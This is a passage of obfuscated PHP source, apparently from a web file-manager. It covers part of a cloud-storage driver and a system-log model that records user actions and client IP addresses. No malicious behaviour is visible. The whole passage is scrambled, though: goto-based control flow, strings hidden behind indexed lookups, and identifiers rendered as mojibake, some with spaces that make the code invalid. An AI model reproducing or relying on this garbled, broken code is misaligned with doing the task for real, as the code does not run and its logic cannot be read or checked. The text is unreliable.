$fŸ˜Èòáßˆ[0] = $C‰àã∫Ùã[221]; } if (isset($cíöã¯—È·[$C‰àã∫Ùã[222]]) && $cíöã¯—È·[$C‰àã∫Ùã[222]] == $C‰àã∫Ùã[223]) { $fŸ˜Èòáßˆ[0] = $C‰àã∫Ùã[223]; } goto BÇê∆Í¡∂¡; Fô˘ﬁ•£•¡: $C‰àã∫Ùã =& $_SERVER[Æ¡î¢≠¯™]; $eœŸ¥·§Ìã = isset($cíöã¯—È·[$C‰àã∫Ùã[217]]) ? $cíöã¯—È·[$C‰àã∫Ùã[217]] : gmdate($C‰àã∫Ùã[215]); $EÛá‹µ„ú = isset($cíöã¯—È·[$C‰àã∫Ùã[167]]) ? $cíöã¯—È·[$C‰àã∫Ùã[167]] : $C‰àã∫Ùã[33]; goto eç äö†Ù∫; eç äö†Ù∫: $e∫⁄Æ®æË≠ = $cíöã¯—È·[$C‰àã∫Ùã[99]]; unset($cíöã¯—È·[$C‰àã∫Ùã[99]]); if (isset($cíöã¯—È·[$C‰àã∫Ùã[218]])) { $cíöã¯—È·[$C‰àã∫Ùã[217]] = $eœŸ¥·§Ìã; return $this->listUploadParts($e∫⁄Æ®æË≠, $cíöã¯—È·); } goto B∆¨©ç®∫«; c‡ºπ»≠ƒÖ: } public function listUploadParts($bΩó»›˘ÿ, $B‡é¢àÒÚë = array()) { goto cèäﬂ´è¡Ï; dùˆı§‘∆’: $F˜ΩﬁŒÈ‰ = $this->multiUploadAuthData($bΩó»›˘ÿ, $B‡é¢àÒÚë); if (empty($F˜ΩﬁŒÈ‰)) { return !1; } return array($Bå‡Ö™·£æ[226] => $F˜ΩﬁŒÈ‰, $Bå‡Ö™·£æ[217] => $B‡é¢àÒÚë[$Bå‡Ö™·£æ[217]], $Bå‡Ö™·£æ[228] => $D‘Ó≈ï‡ÖŒ); goto aèó´Éã»÷; cèäﬂ´è¡Ï: $Bå‡Ö™·£æ =& $_SERVER[Æ¡î¢≠¯™]; $EÕÀôπÁã§ = str_replace($Bå‡Ö™·£æ[227], $Bå‡Ö™·£æ[33], $B‡é¢àÒÚë[$Bå‡Ö™·£æ[167]]); $D‘Ó≈ï‡ÖŒ = $this->client->listParts($this->bucket, $bΩó»›˘ÿ, $EÕÀôπÁã§); goto Dπ⁄áØëˆ”; Dπ⁄áØëˆ”: if (!$D‘Ó≈ï‡ÖŒ) { return !1; } unset($B‡é¢àÒÚë[$Bå‡Ö™·£æ[218]], $B‡é¢àÒÚë[$Bå‡Ö™·£æ[222]]); $B‡é¢àÒÚë[$Bå‡Ö™·£æ[99]] = $bΩó»›˘ÿ; goto dùˆı§‘∆’; aèó´Éã»÷: } public function getHost() { return parent::getHost() . $_SERVER[Æ¡î¢≠¯™][8] . $this->bucket; } public function size($fÑø°’Íéã) { $BÉøπŸíﬁÕ = $this->objectMeta($fÑø°’Íéã); return $BÉøπŸíﬁÕ ? $BÉøπŸíﬁÕ[$_SERVER[Æ¡î¢≠¯™][87]] : 0; } public function info($FΩÏ®÷ÖãÉ) { if ($this->isFolder($FΩÏ®÷ÖãÉ)) { return $this->folderInfo($FΩÏ®÷ÖãÉ); } else { if ($this->isFile($FΩÏ®÷ÖãÉ)) { return $this->fileInfo($FΩÏ®÷ÖãÉ); } } return !1; } public function exist($Fﬁ∆ÙÖ≠¯·) { return $this->isFile($Fﬁ∆ÙÖ≠¯·) || $this->isFolder($Fﬁ∆ÙÖ≠¯·); } public function isFile($AŒ∂∂éÑœ˜) { return !$this->isFolder($AŒ∂∂éÑœ˜) && $this->objectMeta($AŒ∂∂éÑœ˜); } public function isFolder($AÜ’Ù•∑⁄æ) { return $this->cacheMethod($_SERVER[Æ¡î¢≠¯™][229], $AÜ’Ù•∑⁄æ); } protected function objectMeta($F˜†å˘óä–) { return $this->cacheMethod($_SERVER[Æ¡î¢≠¯™][230], $F˜†å˘óä–); } protected function _objectMeta($D∂âáï≤Æï) { $b∆†É´æÿ‘ =& $_SERVER[Æ¡î¢≠¯™]; $D∂âáï≤Æï = rtrim($D∂âáï≤Æï, $b∆†É´æÿ‘[8]); try { $f©Ù≤‘óÓ± = $this->client->getObjectInfo($this->bucket, $D∂âáï≤Æï); if (!isset($f©Ù≤‘óÓ±[$b∆†É´æÿ‘[214]]) && isset($f©Ù≤‘óÓ±[$b∆†É´æÿ‘[231]])) { $f©Ù≤‘óÓ±[$b∆†É´æÿ‘[214]] = $f©Ù≤‘óÓ±[$b∆†É´æÿ‘[231]]; } } catch (OSS\Core\OssException $fâ·∆ë≥ò∞) { $f©Ù≤‘óÓ± = !1; } if (!$f©Ù≤‘óÓ±) { } return $f©Ù≤‘óÓ±; } protected function _isFolder($Cƒ®∫ßΩ˘ª) { goto a∞—ãç∏∂ÿ; EÊµµ…ö¥≠: $bòûÿŸ◊Ô = $this->client->getBucket($this->bucket, $Cƒ®∫ßΩ˘ª, null, 1); if (empty($bòûÿŸ◊Ô)) { return !1; } $bòûÿŸ◊Ô = array_values($bòûÿŸ◊Ô); goto aŸÉµÕ˜ìÿ; aŸÉµÕ˜ìÿ: if (substr($bòûÿŸ◊Ô[0][$d£ë‘ŒÖ»Ù[28]], -1) == $d£ë‘ŒÖ»Ù[8]) { return !0; } if (get_path_this($bòûÿŸ◊Ô[0][$d£ë‘ŒÖ»Ù[28]]) == get_path_this($Cƒ®∫ßΩ˘ª)) { return !1; } return !0; goto eÕçËíÃ‰∆; a∞—ãç∏∂ÿ: $d£ë‘ŒÖ»Ù =& $_SERVER[Æ¡î¢≠¯™]; $Cƒ®∫ßΩ˘ª = rtrim($Cƒ®∫ßΩ˘ª, $d£ë‘ŒÖ»Ù[8]); if ($Cƒ®∫ßΩ˘ª == $d£ë‘ŒÖ»Ù[33] || $Cƒ®∫ßΩ˘ª == $d£ë‘ŒÖ»Ù[8]) { return !0; } goto EÊµµ…ö¥≠; eÕçËíÃ‰∆: } } goto Aåœ›∞åª≠; a¥ºº„‡êè: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\x6d\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\143\162\145\141\164\x65\124\151\x6d\145", "\x74\151\155\145", "\151\x6e\x73\145\162\x74", "\x66\165\x6e\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $C∆Âıú≈∂ë =& $_SERVER[Æ¡î¢≠¯™]; return array($C∆Âıú≈∂ë[2325] => LNG($C∆Âıú≈∂ë[2326]), $C∆Âıú≈∂ë[2327] => LNG($C∆Âıú≈∂ë[2328]), $C∆Âıú≈∂ë[2001] => LNG($C∆Âıú≈∂ë[2329]), $C∆Âıú≈∂ë[2330] => LNG($C∆Âıú≈∂ë[2331]), $C∆Âıú≈∂ë[2332] => LNG($C∆Âıú≈∂ë[2333]), $C∆Âıú≈∂ë[2334] => LNG($C∆Âıú≈∂ë[2335]), $C∆Âıú≈∂ë[2336] => LNG($C∆Âıú≈∂ë[2337]), $C∆Âıú≈∂ë[2338] => LNG($C∆Âıú≈∂ë[2339]), $C∆Âıú≈∂ë[2032] => LNG($C∆Âıú≈∂ë[2340]), $C∆Âıú≈∂ë[2033] => LNG($C∆Âıú≈∂ë[2341]), $C∆Âıú≈∂ë[2342] => LNG($C∆Âıú≈∂ë[2343]), $C∆Âıú≈∂ë[2344] => LNG($C∆Âıú≈∂ë[2345]), $C∆Âıú≈∂ë[2346] => LNG($C∆Âıú≈∂ë[2347]), $C∆Âıú≈∂ë[2348] => LNG($C∆Âıú≈∂ë[2349]), $C∆Âıú≈∂ë[2030] => LNG($C∆Âıú≈∂ë[2350]), $C∆Âıú≈∂ë[2036] => LNG($C∆Âıú≈∂ë[2351]), $C∆Âıú≈∂ë[2352] => LNG($C∆Âıú≈∂ë[2353]), $C∆Âıú≈∂ë[2354] => LNG($C∆Âıú≈∂ë[2355]), $C∆Âıú≈∂ë[2356] => LNG($C∆Âıú≈∂ë[2357]), $C∆Âıú≈∂ë[2358] => LNG($C∆Âıú≈∂ë[2359]), $C∆Âıú≈∂ë[2039] => LNG($C∆Âıú≈∂ë[2360]), $C∆Âıú≈∂ë[2040] => LNG($C∆Âıú≈∂ë[2361]), $C∆Âıú≈∂ë[2362] => LNG($C∆Âıú≈∂ë[2363]), $C∆Âıú≈∂ë[2364] => LNG($C∆Âıú≈∂ë[2365]), $C∆Âıú≈∂ë[2366] => LNG($C∆Âıú≈∂ë[2367]), $C∆Âıú≈∂ë[2368] => LNG($C∆Âıú≈∂ë[2369]), $C∆Âıú≈∂ë[2370] => LNG($C∆Âıú≈∂ë[2371]), $C∆Âıú≈∂ë[2034] => LNG($C∆Âıú≈∂ë[2372]), $C∆Âıú≈∂ë[2373] => LNG($C∆Âıú≈∂ë[2374]), $C∆Âıú≈∂ë[2375] => LNG($C∆Âıú≈∂ë[2376]), $C∆Âıú≈∂ë[2377] => LNG($C∆Âıú≈∂ë[2377]), $C∆Âıú≈∂ë[2378] => LNG($C∆Âıú≈∂ë[2005]), $C∆Âıú≈∂ë[2379] => LNG($C∆Âıú≈∂ë[2380]), $C∆Âıú≈∂ë[2381] => LNG($C∆Âıú≈∂ë[2382]), $C∆Âıú≈∂ë[2383] => LNG($C∆Âıú≈∂ë[2384]), $C∆Âıú≈∂ë[2385] => LNG($C∆Âıú≈∂ë[2386]), $C∆Âıú≈∂ë[2387] => LNG($C∆Âıú≈∂ë[2387]), $C∆Âıú≈∂ë[2388] => LNG($C∆Âıú≈∂ë[2389]), $C∆Âıú≈∂ë[2390] => LNG($C∆Âıú≈∂ë[2391]), $C∆Âıú≈∂ë[2392] => LNG($C∆Âıú≈∂ë[2393]), $C∆Âıú≈∂ë[2394] => LNG($C∆Âıú≈∂ë[2395]), $C∆Âıú≈∂ë[2396] => LNG($C∆Âıú≈∂ë[2397]), $C∆Âıú≈∂ë[2398] => LNG($C∆Âıú≈∂ë[2399])); } private function typeFile() { $b°©òô‹…± =& $_SERVER[Æ¡î¢≠¯™]; $cŒ„‘ºª∞Á = array($b°©òô‹…±[2036] => array($b°©òô‹…±[2037]), $b°©òô‹…±[2346] => array($b°©òô‹…±[2400]), $b°©òô‹…±[2348] => array($b°©òô‹…±[2401]), $b°©òô‹…±[2030] => array($b°©òô‹…±[2031]), $b°©òô‹…±[2354] => array(), $b°©òô‹…±[2356] => array(), $b°©òô‹…±[2358] => array(), $b°©òô‹…±[2039] => array($b°©òô‹…±[2041]), $b°©òô‹…±[2040] => array($b°©òô‹…±[2041]), $b°©òô‹…±[2362] => array($b°©òô‹…±[2402]), $b°©òô‹…±[2364] => array($b°©òô‹…±[2402]), $b°©òô‹…±[2366] => array($b°©òô‹…±[2403]), $b°©òô‹…±[2352] => array($b°©òô‹…±[2404]), $b°©òô‹…±[2368] => array($b°©òô‹…±[2405]), $b°©òô‹…±[2370] => array($b°©òô‹…±[2406]), $b°©òô‹…±[2034] => array($b°©òô‹…±[2035])); return $cŒ„‘ºª∞Á; } private function typeAll() { goto Bª¶Ωê≥ﬂä; Bª¶Ωê≥ﬂä: $F ˜µ¬‡ˆµ =& $_SERVER[Æ¡î¢≠¯™]; $eÍã¡øÏƒº = $this->typeList; $Aé´ê∞‚ê∆ = array_filter($this->typeFile()); goto Dó¬Ú¢í≠ï; Dó¬Ú¢í≠ï: foreach ($Aé´ê∞‚ê∆ as $cÁôéÍ„ôÉ => $dﬁŒçãË÷›) { $eÍã¡øÏƒº[$dﬁŒçãË÷›[0]] = $eÍã¡øÏƒº[$cÁôéÍ„ôÉ]; } $eÍã¡øÏƒº[$F ˜µ¬‡ˆµ[2041]] = LNG($F ˜µ¬‡ˆµ[2407]); $eÍã¡øÏƒº[$F ˜µ¬‡ˆµ[2402]] = LNG($F ˜µ¬‡ˆµ[2408]); goto dÈ±Ç∞¢ëË; dÈ±Ç∞¢ëË: return $eÍã¡øÏƒº; goto a‚«†À∏î¡; a‚«†À∏î¡: } public function addLog($BçËÌÙêê∞, $D‹©ƒØ’Æ§ = array()) { goto Dôæ“≤∏œ; f§◊±∫∫˜º: parent::add($D‹©ƒØ’Æ§); goto EıÓåÎãëë; Dôæ“≤∏œ: $Cëñ¡ˆ¶ãì =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($this->typeList[$BçËÌÙêê∞])) { return; } $AÂ—∫’éÿÏ = USER_ID ? USER_ID : (isset($D‹©ƒØ’Æ§[$Cëñ¡ˆ¶ãì[1397]]) ? $D‹©ƒØ’Æ§[$Cëñ¡ˆ¶ãì[1397]] : 0); goto e·ˆﬂÖÑ™ƒ; e·ˆﬂÖÑ™ƒ: $bÉÏ‚—ﬁ∫≈ = get_client_ip(); if (!$D‹©ƒØ’Æ§ || strlen(json_encode($D‹©ƒØ’Æ§)) >= 1024) { $D‹©ƒØ’Æ§ = array($Cëñ¡ˆ¶ãì[2409] => $bÉÏ‚—ﬁ∫≈); } else { if (is_array($D‹©ƒØ’Æ§)) { $D‹©ƒØ’Æ§[$Cëñ¡ˆ¶ãì[2409]] = $bÉÏ‚—ﬁ∫≈; } else { $D‹©ƒØ’Æ§ = array($Cëñ¡ˆ¶ãì[1020] => $D‹©ƒØ’Æ§, $Cëñ¡ˆ¶ãì[2409] => $bÉÏ‚—ﬁ∫≈); } } $D‹©ƒØ’Æ§ = array($Cëñ¡ˆ¶ãì[1387] => Session::sign(), $Cëñ¡ˆ¶ãì[1388] => $AÂ—∫’éÿÏ, $Cëñ¡ˆ¶ãì[29] => $BçËÌÙêê∞, $Cëñ¡ˆ¶ãì[1390] => json_encode($D‹©ƒØ’Æ§)); goto f§◊±∫∫˜º; EıÓåÎãëë: } public function remove($d÷ì«ÿœ˘Ã) { $this->where(array($_SERVER[Æ¡î¢≠¯™][390] => $d÷ì«ÿœ˘Ã))->delete(); } private function _makeOrder($AãÀ™«—¥õ = '') { goto D∏°»‹‚‘∫; b¯í‚À‹ﬁ˜: $E‹‘Ö¬ã‡Ó = Input::get($FÔ ƒùóîß[412], $FÔ ƒùóîß[7], $FÔ ƒùóîß[2199], array($FÔ ƒùóîß[2136], $FÔ ƒùóîß[408])); $E‹‘Ö¬ã‡Ó = $aóÙ°•ü∆÷[$E‹‘Ö¬ã‡Ó]; $AãÀ™«—¥õ = $AãÀ™«—¥õ . "{$bù…º‡üÿÂ}\40{$E‹‘Ö¬ã‡Ó}"; goto d¡≠Ùø€±î; d¡≠Ùø€±î: return $this->order($AãÀ™«—¥õ); goto díÒÑ¯¢ô≈; D∏°»‹‚‘∫: $FÔ ƒùóîß =& $_SERVER[Æ¡î¢≠¯™]; $bù…º‡üÿÂ = $FÔ ƒùóîß[194]; $aóÙ°•ü∆÷ = array($FÔ ƒùóîß[406] => $FÔ ƒùóîß[407], $FÔ ƒùóîß[408] => $FÔ ƒùóîß[409]); goto b¯í‚À‹ﬁ˜; díÒÑ¯¢ô≈: } public function get($EîúÊ êÓœ = '') { goto B≈êçÔÍ≤Ã; B≈êçÔÍ≤Ã: $DêÁµ∑íä÷ =& $_SERVER[Æ¡î¢≠¯™]; if (!$EîúÊ êÓœ) { show_json(array()); } $B∏“ƒúüÑÊ = array(); goto AëçÜÖÊª; AëçÜÖÊª: if ($EîúÊ êÓœ[$DêÁµ∑íä÷[1397]]) { $B∏“ƒúüÑÊ[$DêÁµ∑íä÷[1397]] = $EîúÊ êÓœ[$DêÁµ∑íä÷[1397]]; } if (isset($EîúÊ êÓœ[$DêÁµ∑íä÷[694]])) { $F•≠àôëÔò = $EîúÊ êÓœ[$DêÁµ∑íä÷[694]]; $C®ÉÒ∂–œÕ = isset($EîúÊ êÓœ[$DêÁµ∑íä÷[695]]) ? $EîúÊ êÓœ[$DêÁµ∑íä÷[695]] : time(); $B∏“ƒúüÑÊ[$DêÁµ∑íä÷[194]] = array($DêÁµ∑íä÷[327], array($F•≠àôëÔò, $C®ÉÒ∂–œÕ)); } if ($EîúÊ êÓœ[$DêÁµ∑íä÷[29]]) { $DÀªëœŒ≤á = explode($DêÁµ∑íä÷[47], $EîúÊ êÓœ[$DêÁµ∑íä÷[29]]); $dâ∞®Ã ∞´ = $this->typeFile(); $e»ß›Í◊ˆŸ = array(); foreach ($DÀªëœŒ≤á as $Eﬁ¡ùµì∏Œ) { $e»ß›Í◊ˆŸ[] = $Eﬁ¡ùµì∏Œ; if (isset($dâ∞®Ã ∞´[$Eﬁ¡ùµì∏Œ])) { $e»ß›Í◊ˆŸ = array_merge($e»ß›Í◊ˆŸ, $dâ∞®Ã ∞´[$Eﬁ¡ùµì∏Œ]); } } $e»ß›Í◊ˆŸ = array_unique($e»ß›Í◊ˆŸ); if ($e»ß›Í◊ˆŸ) { $B∏“ƒúüÑÊ[$DêÁµ∑íä÷[29]] = array($DêÁµ∑íä÷[7], $e»ß›Í◊ˆŸ); } } goto c∫â ˜ÿá; D≠Øø¡®¶ç: $c•ì„É≠û∫[$DêÁµ∑íä÷[360]] = $this->logList($c•ì„É≠û∫[$DêÁµ∑íä÷[360]]); return $c•ì„É≠û∫; goto A¶ë°ƒÇ∂˘; c∫â ˜ÿá: if (!empty($EîúÊ êÓœ[$DêÁµ∑íä÷[2409]])) { $B∏“ƒúüÑÊ[$DêÁµ∑íä÷[409]] = array($DêÁµ∑íä÷[743], "\x25{$EîúÊ êÓœ[$DêÁµ∑íä÷[2409]]}\x25"); } $c•ì„É≠û∫ = $this->_makeOrder()->where($B∏“ƒúüÑÊ)->selectPage(); if (empty($c•ì„É≠û∫[$DêÁµ∑íä÷[360]])) { show_json(array(), !0, $c•ì„É≠û∫[$DêÁµ∑íä÷[357]]); } goto D≠Øø¡®¶ç; A¶ë°ƒÇ∂˘: } private function ipAddress(&$EÇ‡Â≠ï÷Â) { $c¡‡÷¬è◊ß =& $_SERVER[Æ¡î¢≠¯™]; if (!empty($EÇ‡Â≠ï÷Â[$c¡‡÷¬è◊ß[2409]])) { $F‹ôë˘ùà‚ = IpLocation::get($EÇ‡Â≠ï÷Â[$c¡‡÷¬è◊ß[2409]]); if ($F‹ôë˘ùà‚ == $c¡‡÷¬è◊ß[2410]) { $F‹ôë˘ùà‚ = $c¡‡÷¬è◊ß[2411]; } } else { $F‹ôë˘ùà‚ = LNG($c¡‡÷¬è◊ß[2412]); } $EÇ‡Â≠ï÷Â[$c¡‡÷¬è◊ß[2413]] = $F‹ôë˘ùà‚; } private function descZipDownload($F⁄µª‡ºéﬁ, &$dóºˆîÑŸ¡) { $dÃê∆Ç∫≈– =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($F⁄µª‡ºéﬁ[$dÃê∆Ç∫≈–[2414]])) { return; } $c«®ÚŒØƒñ = json_decode($F⁄µª‡ºéﬁ[$dÃê∆Ç∫≈–[2414]], !0); foreach ($c«®ÚŒØƒñ as $b§≈∂çá›Ú) { if (!IO::init($b§≈∂çá›Ú[$dÃê∆Ç∫≈–[85]])) { continue; } if (!($E±ü∏É‘–Ù = IO::infoFull($b§≈∂çá›Ú[$dÃê∆Ç∫≈–[85]]))) { continue; } $F⁄µª‡ºéﬁ[$dÃê∆Ç∫≈–[85]] = $b§≈∂çá›Ú[$dÃê∆Ç∫≈–[85]]; $dóºˆîÑŸ¡[] = $F⁄µª‡ºéﬁ[$dÃê∆Ç∫≈–[2232]] = $E±ü∏É‘–Ù[$dÃê∆Ç∫≈–[465]]; break; } return $F⁄µª‡ºéﬁ; } private function getSourceList(&$C‹ï‘ëËÚß) { $A¥÷ÙíÔÌ— =& $_SERVER[Æ¡î¢≠¯™]; $A≤Ú¿‡™åì = array(); foreach ($C‹ï‘ëËÚß as $AàÇéÉ©‰Ë => $FÜ«»üÍüé) { goto B≤öÌ˜≠ÿæ; dí„Úé„Ö‡: if ($c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[29]] == $A¥÷ÙíÔÌ—[2240]) { $A≤Ú¿‡™åì[] = $c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[409]][$A¥÷ÙíÔÌ—[374]]; } goto D˜—æÌîóÒ; B≤öÌ˜≠ÿæ: $c°≠òâÿÏ· = json_decode($FÜ«»üÍüé[$A¥÷ÙíÔÌ—[409]], !0); if ($FÜ«»üÍüé[$A¥÷ÙíÔÌ—[29]] == $A¥÷ÙíÔÌ—[2033]) { $c°≠òâÿÏ· = $this->descZipDownload($c°≠òâÿÏ·, $A≤Ú¿‡™åì); $C‹ï‘ëËÚß[$AàÇéÉ©‰Ë][$A¥÷ÙíÔÌ—[409]] = json_encode($c°≠òâÿÏ·); continue; } if (strpos($FÜ«»üÍüé[$A¥÷ÙíÔÌ—[29]], $A¥÷ÙíÔÌ—[2233]) !== 0) { goto eâÈÎÊÂíõ; eâÈÎÊÂíõ: if (!isset($c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[85]]) || strpos($FÜ«»üÍüé[$A¥÷ÙíÔÌ—[29]], $A¥÷ÙíÔÌ—[2415]) !== 0) { continue; } if (!IO::init($c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[85]])) { continue; } if (!($BÊú¥ó˘Æø = IO::infoFull($c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[85]]))) { continue; } goto a≤∆Ø•€⁄◊; bπœ˘öäÉ—: continue; goto CÇêŒËÖ ‘; a≤∆Ø•€⁄◊: $A≤Ú¿‡™åì[] = $c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[374]] = $BÊú¥ó˘Æø[$A¥÷ÙíÔÌ—[374]]; $A≤Ú¿‡™åì[] = $c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[2232]] = $BÊú¥ó˘Æø[$A¥÷ÙíÔÌ—[465]]; $C‹ï‘ëËÚß[$AàÇéÉ©‰Ë][$A¥÷ÙíÔÌ—[409]] = json_encode($c°≠òâÿÏ·); goto bπœ˘öäÉ—; CÇêŒËÖ ‘: } goto e©ü¥ÒË£í; e©ü¥ÒË£í: $A≤Ú¿‡™åì[] = $c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[374]]; $A≤Ú¿‡™åì[] = $c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[2232]]; if ($c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[29]] == $A¥÷ÙíÔÌ—[496]) { $A≤Ú¿‡™åì[] = $c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[409]][$A¥÷ÙíÔÌ—[992]]; $A≤Ú¿‡™åì[] = $c°≠òâÿÏ·[$A¥÷ÙíÔÌ—[409]][$A¥÷ÙíÔÌ—[993]]; } goto dí„Úé„Ö‡; D˜—æÌîóÒ: } if (!$A≤Ú¿‡™åì) { return array(); } return Model($A¥÷ÙíÔÌ—[744])->sourceListInfo($A≤Ú¿‡™åì, !0); } private function logList($AŸÁˆ≠ßÆé) { goto fÖÒ¡ÀÉèÆ; f∑¥ÇΩõ“Ç: $Bˆ—π÷óˆ‚ = $this->getSourceList($AŸÁˆ≠ßÆé); $E¿Â¡Éé∆» = $this->typeAll(); $cà›Á∞Ω¥‹ = array(); goto e∏ãã·º≈; fÖÒ¡ÀÉèÆ: $D˜ﬁË†∫Ÿ‰ =& $_SERVER[Æ¡î¢≠¯™]; $FƒÙ¶¿∫‹ô = array_to_keyvalue($AŸÁˆ≠ßÆé, $D˜ﬁË†∫Ÿ‰[33], $D˜ﬁË†∫Ÿ‰[1397]); $e≤€≥ÃÛ¡Ñ = Model($D˜ﬁË†∫Ÿ‰[481])->userListInfo(array_unique($FƒÙ¶¿∫‹ô)); goto f∑¥ÇΩõ“Ç; e∏ãã·º≈: $Bâ∫êõ¥ëç = array(); foreach ($AŸÁˆ≠ßÆé as $eÚ®èÙ„Ÿõ => $CØÌÜÈêØ¨) { goto FΩÛëé¯á√; FΩÛëé¯á√: $b£≤ú‘ù‰Ñ = $CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[29]]; $b ã—æΩ¶ƒ = isset($e≤€≥ÃÛ¡Ñ[$CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[1397]]]) ? $e≤€≥ÃÛ¡Ñ[$CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[1397]]] : !1; $A˘É€•…∂Ÿ = strpos($b£≤ú‘ù‰Ñ, $D˜ﬁË†∫Ÿ‰[2416]) === 0 ? LNG($D˜ﬁË†∫Ÿ‰[2417]) : LNG($D˜ﬁË†∫Ÿ‰[2412]); goto BıúÚÑ‡ıß; BıúÚÑ‡ıß: $CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[28]] = isset($b ã—æΩ¶ƒ[$D˜ﬁË†∫Ÿ‰[28]]) ? $b ã—æΩ¶ƒ[$D˜ﬁË†∫Ÿ‰[28]] : LNG($D˜ﬁË†∫Ÿ‰[2412]); $CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[2281]] = isset($b ã—æΩ¶ƒ[$D˜ﬁË†∫Ÿ‰[2281]]) ? $b ã—æΩ¶ƒ[$D˜ﬁË†∫Ÿ‰[2281]] : $D˜ﬁË†∫Ÿ‰[33]; $CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[1305]] = isset($E¿Â¡Éé∆»[$b£≤ú‘ù‰Ñ]) ? $E¿Â¡Éé∆»[$b£≤ú‘ù‰Ñ] : $A˘É€•…∂Ÿ; goto bã„âÚıÇ; bã„âÚıÇ: $CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[2198]] = $b ã—æΩ¶ƒ; $FÊ≤≈€éÒù = json_decode($CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[409]], !0); $CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[2409]] = isset($FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2409]]) ? $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2409]] : $D˜ﬁË†∫Ÿ‰[33]; goto Fò≠πÑÛÍ•; Fò≠πÑÛÍ•: $this->ipAddress($CØÌÜÈêØ¨); if (strpos($b£≤ú‘ù‰Ñ, $D˜ﬁË†∫Ÿ‰[2233]) === 0 || isset($FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2232]])) { goto eπ∂õÃ¡íè; AÉø«øıúƒ: if ($FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[29]] == $D˜ﬁË†∫Ÿ‰[2240]) { $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[409]][$D˜ﬁË†∫Ÿ‰[374]] = $Bˆ—π÷óˆ‚[$FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[409]][$D˜ﬁË†∫Ÿ‰[374]]]; } if ($FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[29]] == $D˜ﬁË†∫Ÿ‰[2028]) { $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2245]] = $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[396]]; $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2232]] = $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2245]][$D˜ﬁË†∫Ÿ‰[374]]; $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[396]] = !1; $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[374]] = $D˜ﬁË†∫Ÿ‰[33]; } if ($FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[396]] && $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[396]][$D˜ﬁË†∫Ÿ‰[376]] == $D˜ﬁË†∫Ÿ‰[1066]) { $Bâ∫êõ¥ëç[] = $CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[372]]; unset($AŸÁˆ≠ßÆé[$eÚ®èÙ„Ÿõ]); continue; } goto c—⁄á±ÑÈ∏; eπ∂õÃ¡íè: $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[396]] = $Bˆ—π÷óˆ‚[$FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[374]]]; $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2245]] = $Bˆ—π÷óˆ‚[$FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2232]]]; if ($FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[29]] == $D˜ﬁË†∫Ÿ‰[496]) { $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[409]][$D˜ﬁË†∫Ÿ‰[992]] = $Bˆ—π÷óˆ‚[$FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[409]][$D˜ﬁË†∫Ÿ‰[992]]]; $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[409]][$D˜ﬁË†∫Ÿ‰[993]] = $Bˆ—π÷óˆ‚[$FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[409]][$D˜ﬁË†∫Ÿ‰[993]]]; } goto AÉø«øıúƒ; c—⁄á±ÑÈ∏: if ($FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2245]] && $FÊ≤≈€éÒù[$D˜ﬁË†∫Ÿ‰[2245]][$D˜ﬁË†∫Ÿ‰[376]] == $D˜ﬁË†∫Ÿ‰[1066]) { $Bâ∫êõ¥ëç[] = $CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[372]]; unset($AŸÁˆ≠ßÆé[$eÚ®èÙ„Ÿõ]); continue; } goto AŒöÍÿÇœç; AŒöÍÿÇœç: } $CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[409]] = $FÊ≤≈€éÒù; goto bº•ë§Ç£ë; bº•ë§Ç£ë: unset($CØÌÜÈêØ¨[$D˜ﬁË†∫Ÿ‰[2418]]); $cà›Á∞Ω¥‹[] = $CØÌÜÈêØ¨; goto 